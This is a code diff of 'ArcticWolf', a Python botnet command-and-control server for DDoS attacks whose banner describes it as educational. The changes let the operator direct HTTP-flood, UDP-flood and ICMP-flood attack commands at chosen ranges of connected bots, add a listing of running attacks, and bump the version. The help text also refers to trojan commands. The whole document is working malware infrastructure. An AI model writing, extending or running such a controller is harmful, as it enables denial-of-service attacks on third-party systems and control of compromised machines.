@@ -9,7 +9,7 @@ from os import path as os_path
 from shutil import rmtree, copy
 from random import randint
 from winsound import Beep
-datasock_list = {}  # dict of bots  {Number:socket}
+datasock_list = {}  # dict of bots  {Number(int):socket}
 last_Heartbeat = {}  # recored the time a bot send its heartbeat message
 ddos_attack_list = [] # recored ddos attack launched
 mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood', 'Mix'] # attack_method
@@ -130,10 +130,10 @@ def post_cmd():
                 print_normal('no bots online')
             else:
                 print_normal("listing all the bots")
+                print_normal("NO.          ip            port          host_name", False)
                 num = 1
                 for i in datasock_list.values():
                     client_addr = i.getpeername()
-                    print_normal("NO.          ip            port          host_name", False)
                     print_normal(f" {num}        {client_addr[0]}        {client_addr[1]}        {socket.gethostbyaddr(client_addr[0])[0]}", False)
                     num += 1
         elif command == "info":
@@ -184,19 +184,23 @@ def post_cmd():
         elif command == 'shut':
             if input(f'Are your sure to shutdown all the bots?, bots num : {len(datasock_list)} (y/n): >>> ') == 'y' or 'Y' or 'yes' or 'YES' or 'Yes':
                 send('shut')
+        elif command == 'attacking_list':
+            print_normal(f'Available attacks : {ddos_attack_list}')
         elif command.split('_')[0] == 'attack':
             try:
             # ddos attack
+                attack_bots = input('Input the No. of the bots you wanted to issue your attack command[use "-" and "," to seperate, DO NOT USE BLANK BETWEEN THEM](Blank for all): >>> ')  or 'ALL'
                 target = command.split('_')[2]
                 if target in ddos_attack_list:
-                    print_normal(f'Already attacking {target}')
+                    if input(f'Already attacking {target}, Do you want do attack it twice at a time?(y/n): >>> ') != 'y':
+                        continue
                 mode = command.split('_')[1]
                 if mode in mode_list:
-                    ok = input(f'Are you sure to attack {target} using {mode}?(y,n) >>>')
+                    ok = input(f'Are you sure to attack {target} using {mode}?(y,n) >>> ')
                     if ok == 'y' or ok == 'Y' or ok == 'yes' or ok == 'YES' or ok == '':
                         ddos_attack_list.append(target)
-                        History_write( f'Start to attack {target} with {mode}', 'A')
-                        send(command)
+                        if send(command, attack_bots) != False:
+                            History_write( f'Start to attack {target} with {mode}, using {attack_bots}', 'A')
                     else:
                         print_normal('All attack canceled')
                 else:
@@ -205,9 +209,10 @@ def post_cmd():
                 print_error(f'Unknown attack command : {command}, attack format : attack_[attack_mode]_[target]')
         elif command == 'stop_ddos':
             # stop attack
+            attack_bots = input('Input the No. of the bots you wanted to issue your attack command[use "-" and "," to seperate, DO NOT USE BLANK BETWEEN THEM](Blank for all): >>> ') or 'ALL'
             ddos_attack_list.clear()
-            History_write('I' 'Stop ddos attack')
-            send(command)
+            if send(command, attack_bots) != False:
+                History_write(f'Stop ddos attack to {attack_bots}')
         elif command.split('=')[0] == 'msg':
             # Only for test : send msg to bots
             send(command)
@@ -228,7 +233,8 @@ def post_cmd():
     --------Attack command--------
                 
     attack_[attack_mode]_[target] : attack the target(url or ip) with attack_mode
-    attack_mode : print out the available attack mode 
+    attack_mode : print out the available attack mode
+    attacking_list : Print out the attack being executed 
     stop_ddos : Stop all attack command
 
     --------Trojan command--------
@@ -322,8 +328,12 @@ def run():
 
 
 
-def send(com : str):
-    '''send command'''
+def send(com : str, target='ALL'):
+    '''
+    send command
+    com : command will be sent
+    target : No of the bots, format : 1-2 or 1,2 or 1, ALL for all bots
+    '''
     try:
         No = 1
         for i in datasock_list.values():
@@ -334,15 +344,34 @@ def send(com : str):
         del datasock_list[No]
         del last_Heartbeat[No]
         print_error(f'\nBot No{No} Disconnected\n')
+    target_list = [] # target bots list
+    # Attempt to process the input send target
+    try:
+        if target == 'ALL':
+            target_list = datasock_list.values()
+        elif ',' in target:
+            for i in target.split(','):
+                target_list.append(datasock_list[int(i)])
+        elif '-' in target:
+            start = int(target.split('-')[0])
+            end = int(target.split('-')[1])
+            for i in datasock_list.keys():
+                if i >= start and i <= end:
+                    target_list.append(datasock_list[i])
+        else:
+            target_list.append(datasock_list[int(target)])
+    except:
+        print_error(f"Wrong target input : {target}")
+        return False
     if com.split('_')[0] == 'attack':
         print_warn(f'doing {com.split("_")[1]} on {com.split("_")[2]}')
-        for i in datasock_list.values():
+        for i in target_list:
             i.sendall(com.encode('utf-8'))
-        print_normal('Attack command has been issued to all bots')
+        print_normal(f'Attack command has been issued to No.{target}')
     elif com.split('_')[0] == 'stop':
-        for i in datasock_list.values():
+        for i in target_list:
             i.sendall(com.encode('utf-8'))
-        print_normal('Stop command has been issued to all bots')
+        print_normal(f'Stop command has been issued to No.{target}')
     elif com.split('=')[0] == 'msg':
         for i in datasock_list.values():
             i.sendall(com.split('=')[1].encode('utf-8'))
@@ -410,13 +439,14 @@ def check_input(input_str, mode, is_default=True):
 
 if __name__ == '__main__':
     '''Program entry'''
+    version = 'v0.1.6'
     print('\033[0;35m' + fr"""
 
 ===========================================================================
 
 [ArcticWolf] : A botnet controller for Ddos attacks using frp (without server)
 ---------------------------------------------------------------------------
-[Version] : v0.1.5.1     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
+[Version] : {version}     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
 
 ===========================================================================
 
@@ -473,6 +503,7 @@ if __name__ == '__main__':
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((ip, port))
     s.listen(5)  # Maximum number of queued connections
+
     threading.Thread(target=run, args=()).start()
     threading.Thread(target=post_cmd, args=()).start()
     if settings_data['BotNet']['Heartbeat']:
